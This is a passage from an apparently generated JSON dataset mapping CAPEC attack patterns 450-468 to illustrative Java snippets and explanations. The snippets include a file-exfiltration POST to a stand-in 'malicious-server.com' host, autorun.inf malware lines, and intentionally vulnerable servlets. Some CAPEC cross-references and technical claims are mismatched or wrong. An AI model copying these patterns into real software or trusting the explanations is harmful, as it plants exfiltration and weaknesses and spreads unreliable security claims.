        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class MaliciousUSB {\n    public static void main(String[] args) {\n        // CWE-67: Improper Handling of Windows Device Names\n        String userInput = \"C:\\\\Users\\\\Public\\\\Documents\\\\malicious\\\\AUX.txt\";\n        File file = new File(userInput);\n        try {\n            // CWE-506: Embedded Malicious Code\n            FileWriter writer = new FileWriter(file);\n            writer.write(\"This is a malicious payload.\");\n            writer.close();\n            // CWE-507: Trojan Horse\n            System.out.println(\"File created successfully.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified example of malware propagation via a USB stick, embodying the main idea of the deprecated CAPEC. The code includes several related CWEs for context:\n\n1. **CWE-67: Improper Handling of Windows Device Names** - The code constructs a pathname from user input that includes a Windows device name (AUX), which can lead to denial of service or information exposure.\n2. **CWE-506: Embedded Malicious Code** - The code writes a malicious payload to a file, representing embedded malicious code.\n3. **CWE-507: Trojan Horse** - The code appears to perform a benign action (creating a file) but actually writes malicious content, representing a Trojan horse.\n\nThe code's functionality is to create a file with a malicious payload, demonstrating how malware can be propagated via a USB stick by exploiting these weaknesses."
    },
    {
        "capec_id": "450",
        "capec_name": "DEPRECATED: Malware Propagation via USB U3 Autorun",
        "code_snippet": "import java.io.*;\n\npublic class MaliciousUSB {\n    public static void main(String[] args) {\n        try {\n            // Simulate copying a benign file\n            File benignFile = new File(\"C:\\\\benign\\\\file.txt\");\n            File maliciousFile = new File(\"D:\\\\autorun.inf\");\n            copyFile(benignFile, maliciousFile);\n\n            // Simulate embedding malicious code\n            embedMaliciousCode(maliciousFile);\n\n            // Simulate untrusted search path\n            String untrustedPath = \"D:\\\\malicious\\\\\";\n            loadLibrary(untrustedPath + \"malicious.dll\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void copyFile(File source, File dest) throws IOException {\n        try (InputStream is = new FileInputStream(source);\n             OutputStream os = new FileOutputStream(dest)) {\n            byte[] buffer = new byte[1024];\n            int length;\n            while ((length = is.read(buffer)) > 0) {\n                os.write(buffer, 0, length);\n            }\n        }\n    }\n\n    private static void embedMaliciousCode(File file) throws IOException {\n        try (FileWriter fw = new FileWriter(file, true)) {\n            fw.write(\"[Autorun]\\n\");\n            fw.write(\"open=malicious.exe\\n\");\n            fw.write(\"icon=malicious.ico\\n\");\n        }\n    }\n\n    private static void loadLibrary(String path) {\n        System.load(path);\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of malware propagation via USB autorun, which is deprecated in favor of embedding a virus into a DLL. The code simulates copying a benign file to a USB drive and then embedding malicious code into an autorun.inf file. It also demonstrates the use of an untrusted search path to load a malicious DLL. The code embodies the main idea of the CAPEC by showing how malware can propagate through USB devices and execute malicious actions, leveraging related CWEs such as Trojan Horse, Embedded Malicious Code, and Untrusted Search Path."
    },
    {
        "capec_id": "451",
        "capec_name": "DEPRECATED: Malware Propagation via Infected Peripheral Device",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\n\npublic class MalwarePropagation {\n    public static void main(String[] args) {\n        try {\n            // Simulate copying a file from an infected peripheral device\n            File sourceFile = new File(\"/media/usb/infectedFile.exe\");\n            File destFile = new File(\"C:/Users/Public/infectedFile.exe\");\n            copyFile(sourceFile, destFile);\n\n            // Simulate executing the copied file\n            Runtime.getRuntime().exec(\"C:/Users/Public/infectedFile.exe\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void copyFile(File source, File dest) throws IOException {\n        try (FileInputStream fis = new FileInputStream(source);\n             FileOutputStream fos = new FileOutputStream(dest)) {\n            byte[] buffer = new byte[1024];\n            int length;\n            while ((length = fis.read(buffer)) > 0) {\n                fos.write(buffer, 0, length);\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified example of malware propagation via an infected peripheral device, aligning with the deprecated CAPEC pattern. The code simulates copying a malicious file from an infected USB device to a public directory on the local machine and then executing it. This embodies the concept of malware propagation through peripheral devices. The code also touches on CWE-589 (Call to Non-ubiquitous API) by using platform-specific paths and commands, which may not be portable across different systems. Additionally, it indirectly relates to CWE-507 (Trojan Horse) as the copied file could contain hidden malicious functionality."
    },
    {
        "capec_id": "452",
        "capec_name": "Infected Hardware",
        "code_snippet": "public class InfectedHardware {\n    private static boolean debugMode = false;\n    private static int[] memoryMappedRegisters = new int[10];\n\n    public static void main(String[] args) {\n        // Simulate normal operation\n        performNormalOperation();\n\n        // Malicious logic hidden from the user\n        if (debugMode) {\n            activateMaliciousLogic();\n        }\n    }\n\n    private static void performNormalOperation() {\n        // Normal hardware operation code\n        System.out.println(\"Performing normal operation...\");\n    }\n\n    private static void activateMaliciousLogic() {\n        // Malicious code that alters hardware behavior\n        System.out.println(\"Activating malicious logic...\");\n        for (int i = 0; i < memoryMappedRegisters.length; i++) {\n            memoryMappedRegisters[i] = 0xDEADBEEF; // Overwrite registers with malicious data\n        }\n    }\n\n    // Simulate improper access control to register interface\n    public static void writeToRegister(int index, int value) {\n        if (index >= 0 && index < memoryMappedRegisters.length) {\n            memoryMappedRegisters[index] = value;\n        }\n    }\n\n    // Simulate activation of debug mode at runtime\n    public static void enableDebugMode() {\n        debugMode = true;\n    }\n}",
        "description": "This Java code snippet represents the concept of 'Infected Hardware' by simulating a scenario where malicious logic is inserted into hardware. The code includes a hidden debug mode that, when activated, triggers malicious behavior by overwriting memory-mapped registers with harmful data. This demonstrates CWE-506 (Embedded Malicious Code) and CWE-509 (Replicating Malicious Code). The improper access control to the register interface (CWE-1262) is shown by the 'writeToRegister' method, which allows writing to hardware registers without proper validation. The 'enableDebugMode' method simulates CWE-1313 (Hardware Allows Activation of Test or Debug Logic at Runtime), allowing the malicious logic to be activated during runtime."
    },
    {
        "capec_id": "453",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Counterfeit Hardware",
        "code_snippet": "public class MaliciousHardwareExample {\n    private static boolean isAuthenticated = false;\n\n    public static void main(String[] args) {\n        // Simulate capture-replay attack\n        String capturedToken = \"validToken123\";\n        if (authenticate(capturedToken)) {\n            System.out.println(\"Access granted.\");\n            // Malicious logic insertion\n            executeMaliciousLogic();\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n    }\n\n    private static boolean authenticate(String token) {\n        // Simulate authentication bypass by capture-replay\n        if (token.equals(\"validToken123\")) {\n            isAuthenticated = true;\n        }\n        return isAuthenticated;\n    }\n\n    private static void executeMaliciousLogic() {\n        // Malicious code that could degrade hardware redundancy\n        System.out.println(\"Executing malicious logic...\");\n        // Example: Injecting errors into a redundant block\n        injectErrors();\n    }\n\n    private static void injectErrors() {\n        System.out.println(\"Injecting errors into hardware redundancy block...\");\n        // Simulated error injection\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where a capture-replay attack is used to bypass authentication, allowing malicious logic to be executed. The `authenticate` method simulates an authentication bypass by accepting a replayed token. Once authenticated, the `executeMaliciousLogic` method is called, which represents the insertion of malicious logic into the system. This logic includes a simulated error injection into a hardware redundancy block, which could degrade the system's redundancy and put it in a degraded operating mode. This example embodies the main idea of CAPEC-452 and related CWEs, highlighting the risks of embedded malicious code and authentication bypass vulnerabilities."
    },
    {
        "capec_id": "454",
        "capec_name": "DEPRECATED: Modification of Existing Components with Counterfeit Hardware",
        "code_snippet": "public class HardwareComponent {\n    private boolean isMalicious = false;\n    private String firmwareVersion = \"1.0.0\";\n\n    public void updateFirmware(String newFirmware) {\n        if (newFirmware.contains(\"malicious\")) {\n            isMalicious = true;\n        }\n        firmwareVersion = newFirmware;\n    }\n\n    public void performOperation() {\n        if (isMalicious) {\n            System.out.println(\"Performing malicious operation...\");\n            // Malicious code execution\n        } else {\n            System.out.println(\"Performing normal operation...\");\n            // Normal operation code\n        }\n    }\n\n    public static void main(String[] args) {\n        HardwareComponent component = new HardwareComponent();\n        component.updateFirmware(\"malicious_firmware_v2.0.0\");\n        component.performOperation();\n    }\n}",
        "description": "This Java code snippet represents a hardware component that can be updated with new firmware. The `updateFirmware` method checks if the new firmware contains the string 'malicious', and if so, sets a flag indicating that the component is now malicious. The `performOperation` method then performs different actions based on whether the component is flagged as malicious. This embodies the idea of CAPEC-452, where malicious logic is inserted into product hardware. The code also touches on CWE-506 (Embedded Malicious Code) by demonstrating how malicious code can be embedded and executed, and CWE-1329 (Reliance on Component That is Not Updateable) by showing the potential risks of updating firmware with malicious content."
    },
    {
        "capec_id": "455",
        "capec_name": "DEPRECATED: Malicious Logic Insertion via Inclusion of Counterfeit Hardware Components",
        "code_snippet": "public class MaliciousHardwareComponent {\n    private boolean isMalicious;\n    private String storedData;\n\n    public MaliciousHardwareComponent(boolean isMalicious) {\n        this.isMalicious = isMalicious;\n        this.storedData = \"Sensitive Data\";\n    }\n\n    public void modifyStoredData() {\n        if (isMalicious) {\n            // CWE-506: Embedded Malicious Code\n            this.storedData = \"Modified Data\";\n        }\n    }\n\n    public String getStoredData() {\n        return this.storedData;\n    }\n\n    public static void main(String[] args) {\n        MaliciousHardwareComponent component = new MaliciousHardwareComponent(true);\n        component.modifyStoredData();\n        System.out.println(\"Stored Data: \" + component.getStoredData());\n    }\n}",
        "description": "This Java code snippet represents a malicious hardware component that can modify stored data, embodying the main idea of CAPEC-457. The class `MaliciousHardwareComponent` has a boolean flag `isMalicious` to indicate if the component is malicious. If it is, the `modifyStoredData` method changes the `storedData` to a different value, representing CWE-506 (Embedded Malicious Code). The `main` method demonstrates the creation of a malicious component and the modification of stored data, highlighting the potential impact of such a component on system integrity."
    },
    {
        "capec_id": "456",
        "capec_name": "Infected Memory",
        "code_snippet": "public class InfectedMemoryExample {\n    private static final int PROTECTED_MEMORY_START = 0x1000;\n    private static final int PROTECTED_MEMORY_END = 0x1FFF;\n    private static final int MIRRORED_MEMORY_START = 0x2000;\n    private static final int MIRRORED_MEMORY_END = 0x2FFF;\n\n    private static byte[] memory = new byte[0x3000];\n\n    public static void main(String[] args) {\n        // Simulate secure boot process\n        secureBoot();\n\n        // Malicious code injection into mirrored memory\n        injectMaliciousCode(MIRRORED_MEMORY_START);\n\n        // Accessing protected memory through mirrored region\n        byte data = readMemory(MIRRORED_MEMORY_START);\n        System.out.println(\"Data from mirrored memory: \" + data);\n    }\n\n    private static void secureBoot() {\n        // Load bootloader code into protected memory\n        for (int i = PROTECTED_MEMORY_START; i <= PROTECTED_MEMORY_END; i++) {\n            memory[i] = (byte) (i & 0xFF); // Dummy bootloader code\n        }\n    }\n\n    private static void injectMaliciousCode(int address) {\n        if (address >= MIRRORED_MEMORY_START && address <= MIRRORED_MEMORY_END) {\n            memory[address] = (byte) 0xDE; // Malicious code\n        }\n    }\n\n    private static byte readMemory(int address) {\n        if (address >= PROTECTED_MEMORY_START && address <= PROTECTED_MEMORY_END) {\n            throw new SecurityException(\"Access to protected memory is denied!\");\n        }\n        return memory[address];\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary can inject malicious code into a mirrored memory region, bypassing the intended access control mechanisms. The `secureBoot` method simulates the secure boot process by loading bootloader code into a protected memory region. The `injectMaliciousCode` method shows how an attacker can insert malicious code into a mirrored memory region, which is not adequately protected. Finally, the `readMemory` method attempts to read from the mirrored memory region, illustrating how the malicious code can be accessed despite the protection on the original memory region. This example embodies the main idea of the CAPEC 'Infected Memory' and highlights the related CWEs, such as improper access control and handling of mirrored or aliased memory regions."
    },
    {
        "capec_id": "457",
        "capec_name": "USB Memory Attacks",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Scanner;\n\npublic class USBMalware {\n    public static void main(String[] args) {\n        try {\n            // Simulate reading sensitive data from a file (e.g., keystrokes, confidential data)\n            File file = new File(\"/path/to/sensitive/data.txt\");\n            FileInputStream fis = new FileInputStream(file);\n            Scanner scanner = new Scanner(fis);\n            StringBuilder data = new StringBuilder();\n            while (scanner.hasNextLine()) {\n                data.append(scanner.nextLine()).append(\"\\n\");\n            }\n            scanner.close();\n            fis.close();\n\n            // Transmit the data in cleartext to a remote server\n            URL url = new URL(\"http://malicious-server.com/exfiltrate\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setDoOutput(true);\n            conn.setRequestMethod(\"POST\");\n            conn.getOutputStream().write(data.toString().getBytes());\n            conn.getOutputStream().flush();\n            conn.getOutputStream().close();\n\n            // Check response from the server\n            int responseCode = conn.getResponseCode();\n            if (responseCode == 200) {\n                System.out.println(\"Data exfiltrated successfully.\");\n            } else {\n                System.out.println(\"Failed to exfiltrate data.\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet simulates a USB malware attack that reads sensitive data from a file and transmits it in cleartext to a remote server. The code embodies the main idea of the CAPEC 'USB Memory Attacks' by demonstrating how malicious code on a USB device can exfiltrate sensitive information. The code also highlights related CWEs: CWE-319 (Cleartext Transmission of Sensitive Information) by sending data in cleartext, and CWE-506 (Embedded Malicious Code) by containing code that performs malicious actions."
    },
    {
        "capec_id": "458",
        "capec_name": "Flash Memory Attacks",
        "code_snippet": "import java.io.FileOutputStream;\nimport java.io.IOException;\n\npublic class FlashMemoryAttack {\n    private static final String BIOS_PATH = \"/dev/bios\";\n    private static final byte[] MALICIOUS_CODE = {0x00, 0x01, 0x02, 0x03}; // Example malicious payload\n\n    public static void main(String[] args) {\n        try {\n            flashMaliciousCode();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void flashMaliciousCode() throws IOException {\n        try (FileOutputStream fos = new FileOutputStream(BIOS_PATH)) {\n            fos.write(MALICIOUS_CODE);\n            System.out.println(\"Malicious code flashed to BIOS.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a flash memory attack, where malicious code is written to the BIOS of a device. The `flashMaliciousCode` method opens a file output stream to the BIOS path and writes a byte array representing the malicious payload. This embodies the main idea of CAPEC-Flash Memory Attacks, where an adversary inserts malicious logic into a product via flashing the on-board memory. The code also touches on CWE-1282 (Assumed-Immutable Data is Stored in Writable Memory) by showing how supposedly immutable BIOS data can be overwritten, and CWE-506 (Embedded Malicious Code) by embedding a malicious payload. The code is a simplified representation and does not include actual malicious logic or real BIOS paths."
    },
    {
        "capec_id": "459",
        "capec_name": "Creating a Rogue Certification Authority Certificate",
        "code_snippet": "import java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.cert.CertificateException;\nimport java.security.cert.CertificateFactory;\nimport java.security.cert.X509Certificate;\nimport java.util.Base64;\n\npublic class RogueCertificateExample {\n    public static void main(String[] args) throws CertificateException, NoSuchAlgorithmException {\n        // Simulate a weak hashing algorithm (e.g., MD5)\n        MessageDigest md = MessageDigest.getInstance(\"MD5\");\n        String originalCSR = \"Original Certificate Signing Request\";\n        String rogueCSR = \"Rogue Certificate Signing Request\";\n\n        // Generate hash for both CSRs\n        byte[] originalHash = md.digest(originalCSR.getBytes());\n        byte[] rogueHash = md.digest(rogueCSR.getBytes());\n\n        // Check if hashes collide (for demonstration, we assume they do)\n        if (MessageDigest.isEqual(originalHash, rogueHash)) {\n            System.out.println(\"Hash collision detected!\");\n\n            // Simulate the trusted CA signing the original CSR\n            String signedBlob = Base64.getEncoder().encodeToString(originalHash);\n\n            // Create a rogue certificate using the signed blob\n            String rogueCertificate = \"-----BEGIN CERTIFICATE-----\\n\" + signedBlob + \"\\n-----END CERTIFICATE-----\";\n\n            // Validate the rogue certificate (improper validation)\n            CertificateFactory cf = CertificateFactory.getInstance(\"X.509\");\n            X509Certificate cert = (X509Certificate) cf.generateCertificate(\n                    new java.io.ByteArrayInputStream(rogueCertificate.getBytes()));\n\n            // Improperly validate the certificate (ignoring host mismatch, chain of trust, etc.)\n            cert.checkValidity();\n            System.out.println(\"Rogue certificate is valid!\");\n        } else {\n            System.out.println(\"No hash collision detected.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of creating a rogue certification authority certificate by exploiting a weak hashing algorithm (MD5) to generate certificate signing requests (CSRs) that result in hash collisions. The code simulates the process of generating two different CSRs that hash to the same value, and then uses the signed blob from a trusted certificate authority (CA) to create a rogue certificate. The rogue certificate is then improperly validated, ignoring potential issues such as host mismatch and chain of trust. This example highlights vulnerabilities related to the use of broken or risky cryptographic algorithms (CWE-327), improper certificate validation (CWE-295), and other related weaknesses."
    },
    {
        "capec_id": "460",
        "capec_name": "HTTP Parameter Pollution (HPP)",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\n@WebServlet(\"/vulnerable\")\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userId = request.getParameter(\"userId\");\n        String action = request.getParameter(\"action\");\n\n        // Vulnerable to HTTP Parameter Pollution\n        if (userId != null && action != null) {\n            response.getWriter().println(\"User ID: \" + userId);\n            response.getWriter().println(\"Action: \" + action);\n        } else {\n            response.getWriter().println(\"Missing parameters\");\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability to HTTP Parameter Pollution (HPP). The servlet processes HTTP GET requests and retrieves 'userId' and 'action' parameters from the query string. If an attacker injects duplicate parameters (e.g., 'userId=123&userId=456'), the behavior of the application may become unpredictable, potentially leading to security issues. This code snippet also touches on related CWEs: improper handling of extra parameters (CWE-235), improper neutralization of input terminators (CWE-147), and the use of GET request method with sensitive query strings (CWE-598). The code does not properly handle multiple parameters with the same name, making it vulnerable to HPP attacks."
    },
    {
        "capec_id": "461",
        "capec_name": "Web Services API Signature Forgery Leveraging Hash Function Extension Weakness",
        "code_snippet": "import java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Arrays;\n\npublic class WebServiceAPI {\n    private static final String SECRET_TOKEN = \"secret\";\n\n    public static void main(String[] args) throws NoSuchAlgorithmException {\n        String userInput = \"userInput\";\n        String forgedInput = userInput + \"&extraParam=forged\";\n\n        String originalHash = generateHash(userInput + SECRET_TOKEN);\n        String forgedHash = generateHash(forgedInput + SECRET_TOKEN);\n\n        if (Arrays.equals(originalHash.getBytes(), forgedHash.getBytes())) {\n            System.out.println(\"Authentication Bypassed!\");\n        } else {\n            System.out.println(\"Authentication Failed.\");\n        }\n    }\n\n    private static String generateHash(String input) throws NoSuchAlgorithmException {\n        MessageDigest md = MessageDigest.getInstance(\"MD5\"); // CWE-328: Use of Weak Hash\n        byte[] hashBytes = md.digest(input.getBytes());\n        StringBuilder sb = new StringBuilder();\n        for (byte b : hashBytes) {\n            sb.append(String.format(\"%02x\", b));\n        }\n        return sb.toString();\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to the CAPEC 'Web Services API Signature Forgery Leveraging Hash Function Extension Weakness'. The code uses a weak hash function (MD5) to generate a hash of user input concatenated with a secret token. An attacker can exploit this by appending additional parameters to the user input and generating a new hash. If the new hash matches the original hash, the attacker can bypass authentication. This example highlights CWE-328 (Use of Weak Hash) and CWE-290 (Authentication Bypass by Spoofing) by showing how weak hashing and improper handling of input can lead to security vulnerabilities."
    },
    {
        "capec_id": "462",
        "capec_name": "Cross-Domain Search Timing",
        "code_snippet": "import java.io.IOException;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class CrossDomainTimingAttack {\n    public static void main(String[] args) throws IOException {\n        String targetUrl = \"http://example.com/sensitiveEndpoint\";\n        long startTime = System.currentTimeMillis();\n        sendGetRequest(targetUrl);\n        long endTime = System.currentTimeMillis();\n        System.out.println(\"Response time: \" + (endTime - startTime) + \" ms\");\n    }\n\n    private static void sendGetRequest(String targetUrl) throws IOException {\n        URL url = new URL(targetUrl);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"GET\");\n        int responseCode = connection.getResponseCode();\n        System.out.println(\"Response Code: \" + responseCode);\n    }\n}",
        "description": "This Java code snippet demonstrates a basic cross-domain timing attack. The attacker sends an HTTP GET request to a target URL and measures the time taken for the server to respond. The response time can reveal information about the server's state or the presence of certain data, even though the attacker cannot directly read the response due to the same-origin policy. This embodies the main idea of CAPEC-233 (Cross-Domain Search Timing) and relates to CWE-385 (Covert Timing Channel) and CWE-208 (Observable Timing Discrepancy). The code does not include CSRF or XSS vulnerabilities directly but focuses on the timing aspect of the attack."
    },
    {
        "capec_id": "463",
        "capec_name": "Padding Oracle Crypto Attack",
        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\nimport javax.crypto.spec.IvParameterSpec;\nimport java.util.Base64;\n\npublic class PaddingOracleExample {\n    private static final String KEY = \"0123456789abcdef\"; // 16-byte key\n    private static final String IV = \"abcdef9876543210\"; // 16-byte IV\n\n    public static void main(String[] args) {\n        try {\n            String ciphertext = \"...\"; // Some base64 encoded ciphertext\n            byte[] decryptedData = decrypt(Base64.getDecoder().decode(ciphertext));\n        } catch (Exception e) {\n            System.out.println(\"Decryption error: \" + e.getMessage()); // CWE-209: Leaking error message\n        }\n    }\n\n    public static byte[] decrypt(byte[] ciphertext) throws Exception {\n        Cipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n        SecretKeySpec keySpec = new SecretKeySpec(KEY.getBytes(), \"AES\");\n        IvParameterSpec ivSpec = new IvParameterSpec(IV.getBytes());\n        cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec);\n        return cipher.doFinal(ciphertext); // CWE-649: No integrity check\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable decryption process that is susceptible to a Padding Oracle Crypto Attack. The code uses AES in CBC mode with PKCS5 padding for decryption. The main vulnerability lies in the error message leakage (CWE-209) when a decryption error occurs, which can inform an attacker about padding errors. Additionally, the code does not perform any integrity checks on the ciphertext (CWE-649), making it easier for an attacker to manipulate the ciphertext and exploit the padding oracle vulnerability. The combination of these issues allows an attacker to decrypt data without knowing the encryption key by leveraging the padding oracle."
    },
    {
        "capec_id": "464",
        "capec_name": "Evercookie",
        "code_snippet": "import java.io.*;\nimport javax.servlet.http.*;\n\npublic class EvercookieExample extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String cookieName = \"evercookie\";\n        String cookieValue = \"sensitiveData\";\n        int maxAge = 60 * 60 * 24 * 365; // 1 year\n\n        // Create a persistent cookie\n        Cookie cookie = new Cookie(cookieName, cookieValue);\n        cookie.setMaxAge(maxAge);\n        response.addCookie(cookie);\n\n        // Store the cookie in multiple locations\n        storeInLocalStorage(response, cookieName, cookieValue);\n        storeInSessionStorage(response, cookieName, cookieValue);\n        storeInFlash(response, cookieName, cookieValue);\n    }\n\n    private void storeInLocalStorage(HttpServletResponse response, String key, String value) throws IOException {\n        response.getWriter().println(\"<script>localStorage.setItem('\" + key + \"', '\" + value + \"');</script>\");\n    }\n\n    private void storeInSessionStorage(HttpServletResponse response, String key, String value) throws IOException {\n        response.getWriter().println(\"<script>sessionStorage.setItem('\" + key + \"', '\" + value + \"');</script>\");\n    }\n\n    private void storeInFlash(HttpServletResponse response, String key, String value) throws IOException {\n        response.getWriter().println(\"<script>document.cookie = '\" + key + \"=' + '\" + value + \"';</script>\");\n    }\n}",
        "description": "This Java servlet code demonstrates the concept of an 'evercookie', which is a highly persistent cookie that remains on the user's machine even after attempts to delete it. The code sets a persistent cookie and stores it in multiple locations: traditional HTTP cookies, local storage, session storage, and Flash cookies. This ensures that if the cookie is deleted from one location, it can be restored from another, embodying the idea of persistence and resilience described in the CAPEC. The code also highlights several related CWEs, such as storing sensitive information in cookies (CWE-539, CWE-315) and the potential for unauthorized access to personal information (CWE-359)."
    },
    {
        "capec_id": "465",
        "capec_name": "Transparent Proxy Abuse",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class TransparentProxy {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            new Thread(new ProxyHandler(clientSocket)).start();\n        }\n    }\n}\n\nclass ProxyHandler implements Runnable {\n    private Socket clientSocket;\n\n    public ProxyHandler(Socket clientSocket) {\n        this.clientSocket = clientSocket;\n    }\n\n    @Override\n    public void run() {\n        try {\n            InputStream clientInput = clientSocket.getInputStream();\n            OutputStream clientOutput = clientSocket.getOutputStream();\n\n            // Read the client's request\n            BufferedReader reader = new BufferedReader(new InputStreamReader(clientInput));\n            String requestLine = reader.readLine();\n\n            // Forward the request to the intended server\n            Socket serverSocket = new Socket(\"example.com\", 80);\n            OutputStream serverOutput = serverSocket.getOutputStream();\n            serverOutput.write((requestLine + \"\\r\\n\").getBytes());\n            serverOutput.flush();\n\n            // Read the server's response\n            InputStream serverInput = serverSocket.getInputStream();\n            BufferedReader serverReader = new BufferedReader(new InputStreamReader(serverInput));\n            String responseLine;\n            while ((responseLine = serverReader.readLine()) != null) {\n                // Forward the response back to the client\n                clientOutput.write((responseLine + \"\\r\\n\").getBytes());\n                clientOutput.flush();\n            }\n\n            // Close connections\n            serverSocket.close();\n            clientSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple transparent proxy server. The proxy listens on port 8080 and forwards client requests to 'example.com' on port 80. The proxy reads the client's request, forwards it to the server, reads the server's response, and then forwards the response back to the client. This process is done transparently, meaning the client is unaware of the proxy's presence. The code embodies the main idea of CAPEC-441 (Transparent Proxy Abuse) and highlights several related CWEs:\n\n1. CWE-441: The proxy does not preserve the original source of the request, making it appear as the source of the request.\n2. CWE-444: The proxy does not handle malformed HTTP requests consistently, which could lead to HTTP request/response smuggling.\n3. CWE-602: The proxy relies on the client to enforce security, which is a flawed approach.\n4. CWE-212: The proxy does not remove sensitive information before forwarding requests and responses, potentially exposing sensitive data.\n5. CWE-941: The proxy may incorrectly specify the destination in the communication channel, leading to unintended behavior."
    },
    {
        "capec_id": "466",
        "capec_name": "Leveraging Active Adversary in the Middle Attacks to Bypass Same Origin Policy",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class VulnerableHttpClient {\n    public static void main(String[] args) throws Exception {\n        String targetUrl = \"http://example.com/api/data\";\n        URL url = new URL(targetUrl);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"GET\");\n\n        // CWE-300: No verification of the server's identity\n        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n        String inputLine;\n        StringBuilder response = new StringBuilder();\n        while ((inputLine = in.readLine()) != null) {\n            response.append(inputLine);\n        }\n        in.close();\n\n        // CWE-602: Client-side enforcement of server-side security\n        if (response.toString().contains(\"<script>\")) {\n            System.out.println(\"Potential XSS detected\");\n        } else {\n            System.out.println(\"Response: \" + response.toString());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable HTTP client that connects to a non-TLS endpoint (http://example.com/api/data). The code does not verify the server's identity (CWE-300), making it susceptible to Man-in-the-Middle (MitM) attacks. Additionally, it performs client-side enforcement of server-side security (CWE-602) by checking for potential XSS in the response, which should be handled server-side. This setup can be exploited by an attacker to bypass the same origin policy (CAPEC-94) when the victim is connected to a public WiFi hotspot, allowing the attacker to intercept and manipulate the communication."
    },
    {
        "capec_id": "467",
        "capec_name": "Cross Site Identification",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.PrintWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Scanner;\n\n@WebServlet(\"/fetchUserInfo\")\npublic class FetchUserInfoServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String socialNetworkApiUrl = \"https://socialnetwork.com/api/userinfo?session=\" + request.getParameter(\"session\");\n        URL url = new URL(socialNetworkApiUrl);\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(\"GET\");\n        conn.setRequestProperty(\"Accept\", \"application/json\");\n\n        if (conn.getResponseCode() != 200) {\n            throw new RuntimeException(\"Failed : HTTP error code : \" + conn.getResponseCode());\n        }\n\n        Scanner scanner = new Scanner(url.openStream());\n        String responseBody = scanner.useDelimiter(\"\\\\A\").next();\n        scanner.close();\n\n        response.setContentType(\"application/json\");\n        PrintWriter out = response.getWriter();\n        out.print(responseBody);\n        out.flush();\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a potential Cross Site Identification attack. The servlet fetches user information from a social networking site using an active session identifier provided as a query parameter. The code does not verify the legitimacy of the request, making it vulnerable to Cross-Site Request Forgery (CSRF) (CWE-352). Additionally, it exposes private personal information (CWE-359) by fetching and displaying user data without proper authorization checks. The use of the GET method with sensitive query strings (CWE-598) further exacerbates the vulnerability. This code snippet embodies the main idea of CAPEC-111 by showing how an attacker can harvest identifying information about a victim through an active session."
    },
    {
        "capec_id": "468",
        "capec_name": "Generic Cross-Browser Cross-Domain Theft",
